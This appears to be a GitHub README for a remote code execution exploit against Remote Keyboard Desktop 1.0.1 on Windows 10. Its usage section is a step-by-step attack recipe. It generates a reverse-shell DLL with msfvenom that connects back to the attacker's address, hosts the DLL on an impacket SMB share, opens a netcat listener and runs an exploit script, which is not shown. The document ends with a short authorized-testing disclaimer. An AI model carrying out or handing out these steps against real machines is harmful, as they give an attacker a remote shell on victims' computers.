# Remote Keyboard Desktop 1.0.1 - RCE Exploit

**Author:** Chokri Hammedi  
**Tested on:** Windows 10 Pro (19045)  
**Version:** 1.0.1  
**Date:** May 17, 2025


## Usage

1. Generate DLL payload:
   `msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=8080 -f dll > shell.dll`

2. Host the payload:
   `impacket-smbserver SHARE . -smb2support`

3. Start listener:
   `nc -lnvp 8080`

4. Run the exploit:
   `python3 exploit.py`

![image](https://github.com/user-attachments/assets/72ffa7ea-3513-4762-ad28-60081d4bd325)

![image](https://github.com/user-attachments/assets/e34148f7-9bfd-40dd-9414-e027e1374457)


## Legal

For authorized testing only. Do not use without explicit permission. Unauthorized use may violate laws.

GitHub: [github.com/blue0x1](https://github.com/blue0x1)
